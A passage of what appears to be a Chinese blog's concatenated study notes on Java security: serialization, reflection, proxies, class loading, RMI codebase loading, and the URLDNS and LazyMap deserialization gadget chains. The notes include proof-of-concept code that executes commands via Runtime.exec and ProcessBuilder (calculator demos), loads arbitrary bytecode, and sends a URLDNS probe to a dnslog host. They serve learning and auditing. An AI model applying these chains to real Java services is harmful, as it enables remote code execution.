String toString(){ #这里重写了toString方法 return &quot;person{&quot;+ &quot;{name:&quot;+name+&quot;}&quot;; } public void setname(String name){ #这是他的静态方法 this.name=name; } public String getName(){ #有返回值的方法 return name; }} 在这里对其进行序列化,主要使用ObjectOutputStream导入序列化流 import java.io.*;public class Main { public static void serialize(final Object obj) throws Exception{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); objectOutputStream.writeObject(obj); } public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); serialize(p); }} 在这里对其进行反序列化而最后的println会调用toString方法 import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class Unserializetest { public static Object unsetialize(String Filename) throws IOException,ClassNotFoundException{ ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } public static void main(String[] args) throws Exception{ person pe = (person) unsetialize(&quot;ser.bin&quot;); System.out.println(pe); }} ##java反序列化安全问题java反序列化和php反序列化类似，都是去寻找可以利用的类和方法，java反序列化时即会调用readObject###利用条件 反序列化点输入可控 使用readObject函数执行反序列化 当前class空间中存在一个可复写readObject的类 可利用当前环境下的readObject进一步构筑利用链###利用形式 readObject中有可控危险方法 入口类参数中包含可控类，该类有危险方法，readObject时调用 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用###重写readObject方法 这里就还是举一个demo： private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);} 重新序列化以及反序列化即可弹出计算器 ####为什么readObject函数需要private属性，传参java.io.ObjectInputStream？ 这个文章里面写了对比readObject重写解释总结来说就是： 我们其实不是重写了readObject，而是利用传入的参数不同，使得其能被重新赋值，执行被复写的参数，这就回答了标题的问题了 而这个条件首先需要方法名为readObject 返回类型为void 传入参数为ObjectInputStream.class类型参数 修饰符不能包含static 修饰符必须包含private###利用可控类执行命令####URLDNS链构造链：HashMap.readObject-&gt;HashMap.hash-&gt;URl.hashcode-&gt;URL.getHostAddress这里简要分析一下poc： java在反序列化时会自动调用readObject，如果此类重写了readObject则会调用该类重写以后的 在HashMap中重写了readObject，并且调用了hash(key) 跟进hash(key),发现其调用了hashCode方法 而这里我们可以跟URL的hashCode方法，在这里就触发getHostAddress，访问dnslog链接 public static void main(String[] args) throws Exception{ HashMap&lt;URL,Integer&gt; hashmap= new HashMap&lt;URL,Integer&gt;(); URL url = new URL(&quot;http://25x9gm.dnslog.cn/&quot;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url,1234); hashmap.put(url,1); hashcodefield.set(url,-1); serialize(hashmap);} 接下来谈谈如何书写这个反序列化链条1.确定我们要反序列化的对象，也就是要实例化的类，很明确这里就是HashMap，接下来需要研究一下，如何传入数据，可以看到readObject中，最后使用的是put","link":"/2022/12/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"title":"java基础语法","text":"##java基础语法###重写 参数列表与被重写方法的参数列表必须完全相同。 返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。 访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。 父类的成员方法只能被它的子类重写。 声明为 final 的方法不能被重写。 声明为 static 的方法不能被重写，但是能够被再次声明。 子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。 子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。 重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。 构造方法不能被重写。 如果不能继承一个类，则不能重写该类的方法。 ##java反射###反射基本概念官方概念：JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法，这种动态获取、调用对象方法的功能称为java语言的反射机制。 反射是通过Class对象(字节码文件)，来知道某个类的所有属性和方法。也就是说通过反射我们可以获取构造器，对象，属性，方法（原本不知道）我的理解：就是获取实例化对象的原本的class。那么此时我们获取到他原本的class以后，想要获取其属性，方法就很容易了。###获取Class对象####通过该类的对象获取对应的Class对象 public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); Class a = p.getClass(); System.out.println(a);} ####通过类名.class静态属性 Class stuClass2 = Student.class;System.out.println(&quot;是否为同一个class对象?&quot;+(stuClass==stuClass2)); 虽然比较简单，但是需要导包，不然会编译错误####通过Class类中的静态方法forName()方法获取 public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); Class a =Class.forName(&quot;person&quot;); System.out.println(a);} ###获取有参构造方法####getConstructor() public Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes) throws NoSuchMethodException, SecurityException { checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), true); return getConstructor0(parameterTypes, Member.PUBLIC);} 这里解释一下，1.首先传出的类型和Constructor有关，这个&lt;T&gt;指的是泛型，意思是传入的类型又右边的数据类型决定2.后面可以发现，他传入的数据类型要求是一个class类，那么我们这里其实可以这样构造 import java.io.*;import java.lang.reflect.Constructor;public class Main { public static void serialize(final Object obj) throws Exception{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); objectOutputStream.writeObject(obj); } public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); Class a =Class.forName(&quot;person&quot;); Constructor personconstructor=a.getConstructor(String.class); person pe1=(person) personconstructor.newInstance(&quot;aaa&quot;); System.out.println(pe1); }} 有几个点解释一下： newInstance() 是java反射框架中类对象(Class)创建新对象的方法 现在获取到person这个原型Class，然后我们想要实例化对象出来（也就是利用），此时我们可以单纯使用newInstance,但是这样的话，此时调用的是person类的无参构造方法public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); Class a =Class.forName(&quot;person&quot;); person pe1=(person) a.newInstance();} 可以使用getConstructor获取其有参构造方法，而里面的参数由于要求写的是类，所以我们的写法是String.class,即通过类名.class静态属性获取其原型Class进行穿参写入 接下来再使用newInstance创建的就是有参的对象了###获取类里面的属性####getFields()&amp;getDeclaredFields()这两个就是打印当前类里面的所有属性,但是加上Declared以后其私有属性也将会被打印出来 public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;,22); Class a =Class.forName(&quot;person&quot;);// Constructor personconstructor=a.getConstructor(String.class);// person pe1=(person) personconstructor.newInstance(&quot;aaa&quot;);// System.out.println(pe1); person pe1=(person) a.newInstance(); Field[] persof=a.getFields(); // Field[] persof=a.getDeclaredFields(); for(Field f:persof){ System.out.println(f); } } ####getField()&amp;getDeclaredField() 更改public属性： public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;,22); Class a =Class.forName(&quot;person&quot;);// Constructor personconstructor=a.getConstructor(String.class);// person pe1=(person) personconstructor.newInstance(&quot;aaa&quot;);// System.out.println(pe1); //person pe1=(person) a.newInstance(); Field persof=a.getField(&quot;age&quot;); // Field[] persof=a.getDeclaredFields();// for(Field f:persof){// System.out.println(f);// } persof.set(p,23); System.out.println(p); } 使用set进行赋值操作，可以看到他的参数为obj和value，也就是说我们需要对一个对象进行赋值操作 更改private属性： public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;,22); Class a =Class.forName(&quot;person&quot;);// Constructor personconstructor=a.getConstructor(String.class);// person pe1=(person) personconstructor.newInstance(&quot;aaa&quot;);// System.out.println(pe1); //person pe1=(person) a.newInstance(); Field persof=a.getDeclaredField(&quot;name&quot;); persof.setAccessible(true); // Field[] persof=a.getDeclaredFields();// for(Field f:persof){// System.out.println(f);// } Field persof1=a.getField(&quot;age&quot;); persof.set(p,&quot;aaa&quot;); persof1.set(p,25); System.out.println(p); } 只需要使用getDeclaredField，并且加上setAccessible(true)###获取类的方法####getDeclaredMethod()/getMethod() Method perMethod=a.getMethod(&quot;getName&quot;);System.out.println(perMethod.invoke(p)) 和上面获取属性的用法类似 这里需要使用invoke来启动这个方法 调用有参方法，需要写清楚类型 Method perMethod=a.getMethod(&quot;getName&quot;, String.class);System.out.println(perMethod.invoke(p,&quot;abcd&quot;)); 获取private方法，也只需要加上perMethod.setAccessible(true)即可触发##java代理###java静态代理若类中方法较多，则静态代理类中需要重写的方法也较多 public class UserProxy implements IUser { IUser user; public UserProxy(){} public UserProxy(IUser user){this.user = user;} @Override public void show() { user.show(); System.out.println(&quot;调用了show&quot;); }} ###java动态代理####构造过程demomain.java: public class ProxyTest { public static void main(String[] args) { IUser user=new UserImpl(); //user.show(); //静态代理// IUser userproxy = new UserProxy();// userproxy.show(); InvocationHandler userInvocationHandler = new UserInvocationHandler(user); IUser userproxy = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),userInvocationHandler); userproxy.show(); }} UserinvocationHandler: import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class UserInvocationHandler implements InvocationHandler { IUser user; public UserInvocationHandler(IUser user){ this.user = user; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { method.invoke(user,args); return null; }} 动态代理利用的是java中的Proxy类来进行代理，其参数由三部分组成，其中最主要的是要自定义一个InvocationHandler，并通过重写其invoke方法来进行动态代理调用，从而弥补静态代理过程中如果有多个方法，需要重写多个方法的缺陷 动态代理使用过程中，除了一开始创建InvocationHandler的时候调用的是InvocationHandler接口，其他的都是属于你所要调用的类的接口，例如这个demo中是IUser,所以后面写的都是IUser####意义代理的意义，其实就是不修改原有的类，但是增加了其功能##java类加载机制###类加载的时候会执行代码情况初始化：静态代码块实例化：构造代码块，无参构造函数####动态类加载方法Classloader将字节流加载到内存，并使用defineClass加载到JVM生成可以被调用的类。Java源码编译之后生成对应的字节码，字节码的存储形式不只局限于文件，还可以使用访问数据库，URL请求的方式进行获取。存储的字节码还可以使用加密算法进行加密，提高存储安全性 1.Class.forName 不能加载原生类型，但其他类型都是支持的 2.Classloader.loadclass 不能加载原生类型和数组类型，其他类型都是支持的Class.fornameClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader LoadClass-&gt;findClass(重写的方法)-&gt;defineClass(从字节码加载类) public class LoadClassTest { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(&quot;&quot;)} ); Class&lt;?&gt; c = urlClassLoader.loadClass(&quot;Hello&quot;); c.newInstance(); }} defineClass重载加载字节码 public class LoadClassTest { public static void main(String[] args) throws NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException { ClassLoader cl = ClassLoader.getSystemClassLoader(); Method defineClassMethod= ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;Class文件路径&quot;)); Class c = (Class) defineClassMethod.invoke(cl,&quot;要加载的类的名称&quot;,code,0,code.length); c.newInstance(); }} unsafe实现动态类加载 Class c = Unsafe.class;Field theUnsafeField = c.getDeclaredField(&quot;theUnsafe&quot;);theUnsafeField.setAccess","link":"/2022/12/02/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"title":"java-字节码","text":"什么是字节码其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中 更广义上来说，所有能恢复成一个类并在jvm虚拟机里加载的字节序列，都在我们的探讨范围内。 利用URLClassLoader加载远程class文件ClassLoader: ​ 是用来加载字节码文件最基础的方法，是一个加载器，告诉java虚拟机如何加载这个类，java默认的ClassLoader就是根据类名来加载类，，并且类名是类完整路径，如java.lang.Runtime。 URLClassLoaderURLClassLoader实际上是我们平时默认使用的AppClassLoader的父类，所以，URLClassLoader=java类加载器的工作流程 正常情况下，Java会根据配置项sun.boot.class.path和java.class.path中列举到的基础路径（这些路径是经过处理后的java.net.URL类）来寻找.class文件来加载，而这个基础路径有三种情况: URL未以斜杠/结尾，则认为是一个JAR文件，使用JarLoader来寻找类，即为在Jar包中寻找.class文件 URL以斜杠/结尾，且协议名是file，则使用FileLoader来寻找类，即为在本地文件系统中寻找.class文件 URL以斜杠/结尾，且协议名不是file，则使用最基础的Loader来寻找类。 java的URL支持哪些协议JAVA默认提供了对file,ftp,gopher,http,https,jar,mailto,netdoc协议的支持 Loader寻找类loader寻找类，最常见的情况就是http协议。 import java.net.URL;import java.net.URLClassLoader;public class classloader { public static void main(String[] args ) throws Exception { URL[] urls={new URL(&quot;http://localhost:8000/&quot;)}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c =loader.loadClass(&quot;ex_1&quot;); c.newInstance(); }} 利用ClassLoader#defineClass直接加载字节码java加载远程class文件/本地class或jar文件 ClassLoader#loadClass ——&gt; ClassLoader#findClass ——&gt;ClassLoader#defineClass 其中: Loadclass的作用是从已加载的类缓存，父加载器等位置寻找类（双亲委派机制） findClass的作用是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包、或远程http服务器上读取字节码，然后交给defineClass defineClass的作用是处理前面传入的字节码，将其处理为真正的java类 defineClass可以从byte[]还原出一个Class对象 使用defineClass直接加载字节码 import java.lang.reflect.Method;import java.util.Base64;public class defineclass { public static void main(String[] args) throws Exception{ Method defineclass=ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class); defineclass.setAccessible(true); byte[] code=Base64.getDecoder().decode(&quot;字节码内容&quot;); Class hello = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;Hello&quot;,code,0,code.length); hello.newInstance(); }} 使用TemplatesImpl加载字节码TransletClassLoaderTransletClassLoader来自com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 其中重写了defineClass方法 Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length); } 在重写的这个方法中，由于其没有显式声明作用域，，所以其作用域为default，所以也就是说这里的defineClass由其父类的protected类型变成了一个default类型的方法，可以被类外部调用。 而TransletClassLoader#defineClass()向前追溯调用链为 TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass() 利用newTransformer()构造poc： public static void main(String[] args) throws Exception{ byte[] code = Base64.getDecoder().decode(&quot;&quot;) TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][] {code}); setFieldValue(obj,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;); setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl()); obj.newTransformer(); } 其中，setFieldValue方法来设置私有属性，其中_bytecodes、_name和_tfactory._bytecodes是由字节码组成的数组；_name可以是任意字符串，只要不为null即可。 _tfactory需要是一个TransformerFactoryImpl对象，因为TemplatesImpl#defineTransletClasses()方法里有调用到\\_tfactory.getExternalExtensionsMap()如果是null会出错 TemplatesImpl中对加载的字节码有一定要求即，这个字节码对应的类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类 所以，我们需要构造一个特殊的类 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class HelloTemplatesImpl extends AbstractTranslet { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public HelloTemplatesImpl() { super(); System.out.println(&quot;Hello TemplatesImpl&quot;); } } 它继承了AbstractTranslet类，并在构造函数里插入Hello的输出，将其编译成字节码，即可被TemplatesImpl执行 利用BCEL ClassLoader加载字节码package com.govuln; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.Repository; public class HelloBCEL { public static void main(String []args) throws Exception { JavaClass cls = Repository.lookupClass(evil.Hello.class); String code = Utility.encode(cls.getBytes(), true); System.out.println(code); } }","link":"/2022/09/20/java%E5%AD%97%E8%8A%82%E7%A0%81/"},{"title":"java审计-lazymap","text":"Lazymap学习了前面，我们知道在这个利用链中，比较关键的是需要有调动到transform类的方法，因为transform的四个方法组合一下，最终才能成功执行命令，但是在前面我们使用TransformedMap来执行命令的，而在Ysoserial中使用的是lazymap，关键的代码在于其get方法 public Object get(Object key){ if(map.contain(Key)==false){ Object value = factory.transform(key); map.put(key,value); return value; } return map.get(key) } 利用方法在Lazymap，想要利用这个get方法，需要使用AnnotationInvocationHandler类的invoke方法 java对象代理作用实现类似php的魔术方法_call，劫持一个对象内部的方法调用——java.reflect.Proxy Map proxyMap= (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),Class[] {Map.class},handler); 使用方法:Proxy.newProxyInstance的第一个参数是ClassLoader,，默认即可，第二个参数是需要代理的对象的集合，第三个参数是实现了InvocationHandler接口的对象，里面包含具体代理的逻辑 eg: import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.util.Map;public class ExampleInvocationHandler implements InvocationHandler{ protected Map map; public ExampleInvocationHandler(Map map){ this.map = map; } @Override public Object invoke(Object proxy,Method method, Object[] args) throws Throwable{ if(method.getName().compareTo(&quot;get&quot;)==0){ System.out.println(Method.getName()); return &quot;a&quot;; } return method.invoke(this.map,args); }} ExampleInvocationHandler类实现了invoke方法，作用是检测到调用方法名get的时候返回a和方法名 外部调用这个ExampleInvocationHandler import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map;public class App{ public static void main(String[] args) throws Exception { InvocationHandler handler = new ExampleInvocationHandler(new HashMap()); Map proxyMap=(Map) Proxy.newwPorxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},hander); proxyMap.put(&quot;hello&quot;,&quot;wo&quot;); String result=(String) proxyMap.get(&quot;hello&quot;); System.out.println(result); }} 触发Lazymap过程1.AnnotationInvocationHandler是一个invocationhandler 2.我们将其对象进行proxy，在使用readObject时，调用任意方法，即进入invoke方法中，就会触发Lazymap#get LazyMap构造利用链1.使用Lazymap替换TransformedMap Map outerMap = LazyMap.decorate(innerMap, transformerChain); 对sun.reflect.annotation.AnnotationInvocationHandler对象进行Proxy： Class clazz=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor construct=clazz.getDeclaredConstructor(Class.class,Map.class);construct.setAccessible(true);InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,outerMap);Map proxyMap= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler);","link":"/2022/04/15/java%E5%AE%A1%E8%AE%A1-lazymap/"},{"title":"java审计-rmi协议","text":"RMIRMI是Remote Method Invocation，远程方法调用。是让java虚拟机上的对象调用另一个java虚拟机中对象上的方法。 RMI Server:package org.vulhub.RMI;import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.UnicastRemoteObject;public class RMIServer { //继承了java.rmi.Remote接口，其中定义我们要远程调用的函数hello public interface IRemoteHelloWorld extends Remote { public String hello() throws RemoteException; } //实现此接口的类 public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld { protected RemoteHelloWorld() throws RemoteException { super(); } public String hello() throws RemoteException{ System.out.println(&quot;call from&quot;); return &quot;hello world&quot;; } } //主类，用来创建Registry,并将上面的类实例化后绑定到一个网址 private void start() throws Exception{ RemoteHelloWorld h=new RemoteHelloWorld(); LocateRegistry.createRegistry(1099); Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;,h); } public static void main(String[] args) throws Exception{ new RMIServer().start(); }} 分析: LocateRegistry.createRegistry(1099);Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;,new RemoteHelloWorld()); 第一行创建并运行RMI Registry，第二行将Rexxx对象绑定到Hello这个名字上。 Naming.bind的第一个参数是一个URL，形如:rmi://host:port/name。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。 如果RMI Registry在本地运行，则host和port可以省略，默认为1099 RMI client:package org.vulhub.Train;import org.vulhub.RMI.RMIServer;import java.rmi.Naming;public class TrainMain { public static void main(String[] args) throws Exception{ RMIServer.IRemoteHelloWorld hello=(RMIServer.IRemoteHelloWorld) Naming.lookup(&quot;rmi://127.0.0.1:1099/Heelo&quot;); String ret= hello.hello(); System.out.println(ret); }} 通信分析整个通信过程进行了两次TCP握手，建立了两次TCP连接，首先客户端连接Registry,并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息，然后Registry返回一个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是一个远程对象 RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMIServer；最后，远程⽅法实际上在RMI Server上调⽤。 安全问题1.list+lookup远程调用list方法可以列出目标上所有绑定的对象: String[] s= Naming.list(&quot;rmi://xxx&quot;); 而lookup作用就是获得某个远程对象，若存在危险方法，则可进行调用 2.RMI利用codebase执行任意代码codebase:是一个地址，告诉java虚拟机我们应该从哪个地方去搜索类，通常是远程URL、比如http、ftp等。 如果我们指定codebase=http://exampl.com/,然后加载org.vulhub.example.Example类，则java虚拟机会下载这个文件http://example.com/org/vulhub/example/Example.class ，并作为Example类的字节码。 RMI流程中，反序列化时发现一个对象，先会在CLASSPAATH下寻找，若没找到，则会远程加载codebase中的类。 攻击条件 codebase可控 安装并配置了SecurityManager Java版本低于7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly=false其中java.rmi.server.useCodebaseOnly是在Java 7u21、6u45的时候修改的一个默认设置： https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html PS：当java.rmi.server.useCodebaseOnly为true时，java虚拟机将只信任预先配置好的codebase。 classAnnotations可以使用SerializationDumper查看数据包中的java反序列化内容 通过修改classAnnotations可以控制codebase。","link":"/2022/03/30/java%E5%AE%A1%E8%AE%A1-rmi%E7%AF%87/"},{"title":"java审计(三)","text":"单例模式下如何通过反射实现命令执行getMehtod和invoke方法getMethod的作用是通过反射获取一个类的某个特定的公有方法，java中支持类的重载，我们不能仅通过函数名来确定一个函数，所以在调用getMethod的时候，我们需要传入需要获取的函数的参数类型列表 例子: getMethod(&quot;exec&quot;,String.class) invoke的作用是执行方法，它的第一个参数是：1.如果是普通方法，那么第一个参数是类对象2.如果是静态方法，则第一个参数是类 payload: Class clazz= Class.forName(&quot;java.lang.runtime&quot;); clazz.getMethod(&quot;exec&quot;,String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc.exec&quot;); 将上述paylaod分解完以后可得 Class clazz=Class.forName(&quot;java.lang.runtime&quot;);Method execMethod=clazz.getMethod(&quot;exec&quot;,String.class);Method getRuntimeMethod=clazz.getMethod(&quot;getRuntime&quot;);Object runtime =getRuntimeMethod.invoke(clazz);execMethod.invoke(runtime,&quot;calc.exec&quot;); getConstructor1.getConstructor接收的参数是构造函数列表类型，2.获取到构造函数后，使用newInstance来执行 eg:使用反射获取ProcessBuilder的构造函数，然后调用start()来执行命令 Class clazz=Class.forName(&quot;java.lang.ProcessBuilder&quot;);((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;cacl.exe&quot;))).start(); ProcessBuilder有两个构造函数： 1.public ProcessBuilder(List&lt;string&gt; command)2.public ProcessBuilder(String... command) 但是第一个形式使用了强制类型转化（区别看下面） 但是在表达式上下文中没有此语法，因此需要利用反射 Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))); 通过getMethod(“start”)获取到start方法，然后invoke执行，invoke的第一个参数就是ProcessBuilder Object。 对比一下两者的区别，前者是强制转化为函数来执行命令了，后者是通过反射调用类和方法来执行。 可变长参数可变长参数，java在编译的时候会编译成一个数组 public void hello(String[] names){}public void hello(String...names){} 用法对于反射而言，如果要获取的目标函数里包含可边长参数，则只需将其作为数组即可。 将字符串数组的类String[].class传给getConstructor,获取ProcessBuilder的第二种构造函数： Class clazz=class.forName(&quot;java.lang.ProcessBuilder&quot;);clazz.getConstructor(String[].class) 在调用newInstance的时候，接受的是一个可变长参数，我们传给ProcessBuilder的也是，二者叠加变成二维数组payload: Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{&quot;calc.exe&quot;}})).start(); 私有方法进行反射getDeclared:1.getMethod系列方法获取的是当前类中的所有公共方法，包括从父类继承的方法2.getDeclaredMethod系列方法获取的是当前类中声明的方法，是写在这个类里的，包括私有的方法，但从父类哪里继承来的就不包含了 差异：大概就是getDeclaredMethod可以直接获得到类的私有对象并且可以实例化 Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{&quot;calc.exe&quot;}})).start(); 而setAccessible作用在于修改作用域，否则无法调用 小结看了这么多，大概总结一下，其实就是区分不同情况如何实现命令执行，单利模式，私有方法，使用getMethod或者使用getConstructor，或者是getDeclared来调用其方法，然后在这之前需要用forname，或者是其他方法来获取到这个对象，才可调用其方法","link":"/2022/03/17/java%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%B0%84/"},{"title":"java_URLDNS","text":"readObject/writeObjectjava在序列化一个对象时，将会调用这个对象中的writeobject方法，参数类型是objectOutputStream，开发者可以将任何内容写入这个stream中，反序列化时，会调用readObject，开发者也可以从中读取出前面写入的内容，并进行处理 ysoserial-URLDNSgadget chains：利用链 URLDNS是ysoserial中一个利用链的名字，其结果是一次DNS请求 作用 使用java内置的类构造，对第三方库没有依赖 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 利用链分析触发反序列化的方法是readObject，为了研究ysoserial中的这个利用链，我们从payload入手，其中写到 public class URLDNS implements ObjectPayload&lt;Object&gt;{ public Object getObject(final String url) throws Exception{ ...... HashMap ht = new HashMap(); }} 可以发现，在getObject中返回的被反序列化的对象是HashMap，因此接下来就是在这里打个断点，跟一下其过程 如何使用ysoserial项目进行调试打开工程，然后针对缺少的依赖，可以直接点击+号进行添加 接下来看一下pom.xml可以发现主类是 ysoserial.GeneratePayload 接下来到这个主类这里进行分析，然后右键点击开始debug，在上面设置一下参数 可以发现已经跑起来了，并且在断点这里停下了 分析URLDNS的getObject为反序列化的起点，所以来这里进行分析，发现其调用了HasMap()，并且这边注释到会链接到URL 在hashmap函数中，我们首先看看反序列化方法readObject(),而其中比较特殊的点就在这里，在前面所说 The Java URL class has an interesting property on its equals and * hashCode methods. The URL class will, as a side effect, do a DNS lookup * during a comparison (either equals or hashCode). 因此我们继续跟进这个函数 可以发现，在hash函数调用了hashcode的方法，并且此时传入我们一开始设定的url 再往下，可以发现这里的handler是指向一个url类的（一开始我在这里下断点，但是初始化debug的时候，也会经过这里，而那个只是在寻找jar包，所以这里的key的属性就不同了，导致后面的handler指向的函数也不同，有很多同名函数） 而此时的handler就会指向URLStreamHandler的hashCode方法，在这个hashcode方法中可以发现调用了getHostAddress 继续跟进，可以发现调用了getByName InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询。 总结这次的Gadget流程如下:1.HashMap-&gt;readObject()2.HashMap-&gt;hash()3.URL-&gt;hashCode()4.URLStreamHandler-&gt;hashCode()5.URLStreamHandler-&gt;getHostAddress()6.InetAddress-&gt;getByName() poc知道整条利用链以后，就要学习一下如何编写反序列化exp了，后面再来补坑","link":"/2022/04/04/java%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"java反射机制","text":"如何理解反射反射可以理解为一种手段，对象通过反射可以获取他的类，类可以通过反射获取他的所有方法，通过反射，我们可以将java这种静态语言附加上动态特性。 这种动态获取的信息以及动态调用对象的功能成为java语言的反射机制 如何理解动态特性⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化 获取类对象的方法1.forname()方法通过动态修改forname的参数，可以获取不同的java类 并且其静态方法JVM会装在类，并且执行static()中的代码。 public class reflect_test { public static void main(String[] args) throws ClassNotFoundException{ Class name= Class.forName(&quot;xxxx&quot;); System.out.println(name); }} 2.直接获取任何数据类型都具备静态的属性，因此可以使用.class直接获取其对应的class对象,需要明确用到类中的静态成员 public static void main(String[] args) throws ClassNotFoundException{ Class&lt;?&gt; name=Runtime.class; System.out.println(name);} 3.使用getclass()方法我们可以通过object类中的getclass()方法来获取字节码对象需要明确具体的类，然后创建对象 public static void main(String[] args) throws ClassNotFoundException{ Runtime rt= Runtime.getRuntime(); Class&lt;?&gt; name=rt.getClass(); System.out.println(name);} 4.使用getSystemClassLoader().loadClass()1.类似于forName() 但是不会执行static中的代码。 public static void main(String[] args) throws ClassNotFoundException{ Class&lt;?&gt; name=ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;); System.out.println(name);} 获取类的方法1.getDeclaredMethods方法getDeclaredMethods方法 